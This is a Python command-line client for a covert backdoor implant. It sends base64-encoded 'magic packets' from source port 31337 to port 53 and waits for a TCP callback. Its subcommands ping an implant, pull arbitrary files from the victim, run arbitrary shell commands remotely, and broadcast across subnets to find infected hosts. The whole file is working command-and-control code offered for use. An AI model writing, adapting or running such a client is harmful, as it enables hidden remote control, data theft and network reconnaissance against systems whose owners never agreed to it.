"""Everybody get up, it's time to slam now!"""
import argparse
import base64
import contextlib
import ipaddress
import os
import socket
import time

MAGIC_SRC_PORT = 31337
DEFAULT_DEST_PORT = 53
DEFAULT_LISTEN_PORT = 8080
#DEFAULT_MULTICAST_IP = "239.255.255.250"
SOCKET_TIMEOUT = 15
MAX_ROLLCALL_QUEUE = 64

SUPPORTED_CMDS = [
    "ping",
    "get",
    "exec",
    "rollcall",
]

@contextlib.contextmanager
def _tcp_listener(port, queue_size=1):
    """socket listening for the command response"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", port))
    sock.settimeout(SOCKET_TIMEOUT)
    sock.listen(queue_size)
    yield sock
    sock.close()


@contextlib.contextmanager
def _udp_sender():
    """socket for sending the command"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", MAGIC_SRC_PORT))
    yield sock
    sock.close()


def _send_cmd(msg, ip, dest_port, listen_port):
    """sends a magic cmd packet and returns the response"""
    # we send: "8080;<b64>" --> netfilter adds IP: "172.18.123.1:8080;<b64>"
    encoded = base64.b64encode(msg.encode("ascii"))
    data = f"{listen_port};".encode("ascii") + encoded + b"\x00"

    with _tcp_listener(listen_port) as tcp:
        with _udp_sender() as udp:
            print(f"sending magic packet --> {ip}:{dest_port}")
            udp.sendto(data, (ip, dest_port))
        print("waiting for reply...")
        try:
            sock, addr = tcp.accept()
        except socket.timeout as err:
            raise ConnectionError("No response received!") from err
        response = b""
        while data := sock.recv(4096):
            response += data
        sock.close()
    decoded = base64.b64decode(response)
    if decoded.startswith(b"ERROR"):
        errno = int(decoded.split(b"ERROR: ")[1])
        raise RuntimeError(os.strerror(errno))
    return decoded


def do_ping(ip, dest_port, listen_port, **kwargs):
    """send a ping"""
    msg = "PING"
    response = _send_cmd(msg, ip, dest_port, listen_port).decode("ascii")
    if "PONG" not in response:
        raise ValueError("Invalid response received!")
    print(f"Received PONG from {ip}")


def do_get(ip, dest_port, listen_port, path, output_path, **kwargs):
    """retrieve a file"""
    msg = f"GET {path}"
    response = _send_cmd(msg, ip, dest_port, listen_port)

    filename = os.path.basename(path)
    out = output_path if output_path else filename
    if os.path.isdir(out):
        out = os.path.sep.join((out, filename))
    with open(out, "wb") as f:
        f.write(response)
    print(f"Retrieved {filename} from {ip}")


def do_exec(ip, dest_port, listen_port, cmd, **kwargs):
    """run a system command"""
    msg = f"EXEC {cmd}"
    response = _send_cmd(msg, ip, dest_port, listen_port).decode("ascii")
    try:
        if ";" in response:
            errno, output = response.split(";", 1)
        else:
            errno = int(response)
            output = "[output not captured]"
    except Exception:
        raise RuntimeError("Invalid command output rececived!")
    print(f"\nCommand returned: {errno}")
    print(f"\nCommand output:\n***************\n{output}")
    return errno, output


def do_rollcall(subnets, dest_port, listen_port, expected, **kwargs):
    """broadcast a PING and listen for responses"""
    # we send: "8080;<b64>" --> netfilter adds IP: "172.18.123.1:8080;<b64>"
    encoded = base64.b64encode("PING".encode("ascii"))
    data = f"{listen_port};".encode("ascii") + encoded + b"\x00"
    with _tcp_listener(listen_port, queue_size=expected) as tcp:
        for cidr in subnets:
            broadcast = str(ipaddress.IPv4Network(cidr, strict=False)[-1])
            with _udp_sender() as udp:
                udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                print(f"sending magic packet (multicast) --> {broadcast}:{dest_port}")
                udp.sendto(data, (broadcast, dest_port))
        print("waiting for replies...")
        try:
            responses = []
            while len(responses) < expected:
                sock, hostaddr = tcp.accept()
                ip, _ = hostaddr
                response = sock.recv(64)
                sock.close()
                if "PONG" in base64.b64decode(response).decode("ascii"):
                    print(f"Received PONG from {ip}")
                    responses.append(ip)
                else:
                    print(f"Invalid response from: {ip}")
        except socket.timeout:
            pass
    hosts = []
    for ip in responses:
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            hostname = ip
        hosts.append(hostname)
    return hosts


def main():
    """CLI entry point"""
    parser = argparse.ArgumentParser(description="send it!")
    subparsers = parser.add_subparsers(help="[supported commands]")
    parser.add_argument(
        "-i", "--ip",
        default="127.0.0.1",
        help="IP address of host machine",
    )
    parser.add_argument(
        "-d", "--dest-port",
        type=int,
        default=DEFAULT_DEST_PORT,
        help="destination port number",
    )
    parser.add_argument(
        "-l", "--listen-port",
        type=int,
        default=DEFAULT_LISTEN_PORT,
        help="TCP port to listen on for a response"
    )
    # ping
    ping_parser = subparsers.add_parser("ping", help="ping a target")
    ping_parser.set_defaults(func=do_ping)
    # get
    get_parser = subparsers.add_parser("get", help="retrieve a file")
    get_parser.add_argument(
        "path",
        help="file to retrieve",
    )
    get_parser.add_argument(
        "-o", "--output-path",
        required=False,
        help="local path for retrieved file",
    )
    get_parser.set_defaults(func=do_get)
    # exec
    exec_parser = subparsers.add_parser("exec", help="run a system command")
    exec_parser.add_argument(
        "cmd",
        help="command to run",
    )
    exec_parser.set_defaults(func=do_exec)
    # rollcall
    rollcall_parser = subparsers.add_parser("rollcall", help="multicast ping")
    rollcall_parser.add_argument(
        "-s", "--subnets",
        required=True,
        nargs="+",
        help="CIDR-notated subnet(s) to multicast on, e.g. \"172.20.96.0/20)\"",
    )
    rollcall_parser.add_argument(
        "-e", "--expected",
        type=int,
        default=MAX_ROLLCALL_QUEUE,
        help="number of expected responses",
    )
    rollcall_parser.set_defaults(func=do_rollcall)
    # run with it
    args = parser.parse_args()
    args.func(**vars(args))


if __name__ == "__main__":
    main()